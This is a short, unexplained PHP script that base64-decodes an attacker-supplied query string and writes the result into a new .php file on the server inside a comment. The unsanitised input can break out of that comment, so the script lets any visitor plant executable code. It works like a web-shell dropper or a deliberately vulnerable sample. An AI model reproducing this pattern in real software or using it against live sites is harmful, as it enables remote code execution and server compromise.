<?php
$qs=$_SERVER['QUERY_STRING'];
if ( $qs === '' ) {
  echo "";
}else{
  if ( is_nan($qs[0]) || $qs[1]!='=' ) { exit; }    
  $x=explode("=",$qs);
  while ( ($x[0]+0)>0 ) {
    $x[0]=($x[0]+0)-1;
    $x[1]=$x[1].chr(0x61-36);
  }
  if ( ($z=base64_decode(str_replace('+','',$x[1]))) ) {
    $f=fopen("m68k-svr_hash-dir/m68k-svr_hash-".md5($z).".php","w");
    fwrite($f,"<?php\n#".$z."?>\n");
    fclose($f);
    echo "ok\n";
  }
}
?>
